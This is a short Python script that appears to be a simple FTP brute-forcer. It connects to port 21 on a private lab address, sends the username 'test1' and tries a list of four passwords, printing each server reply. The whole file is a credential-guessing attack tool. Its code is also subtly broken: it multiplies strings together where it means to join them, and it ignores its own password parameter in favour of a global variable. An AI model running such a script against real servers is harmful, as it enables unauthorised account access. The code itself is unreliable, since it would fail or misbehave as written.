import socket
import re
import sys

def connection(ip,user,passw):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Trying " + ip + ":" + user + ":" + passw)
    sock.connect((ip,21))
    data = sock.recv(1024)
    sock.send('USER ' + user * '\r\n')
    data = sock.recv(1024)
    sock.send('PASS ' + password * '\r\n')
    data = sock.recv(1024)
    sock.send('quit\r\n')
    sock.close()
    return data

user = 'test1'
passwords = ['test1', 'test2', 'test3', 'test4']

for password in passwords:
    print (connection('172.16.63.135',user,password))



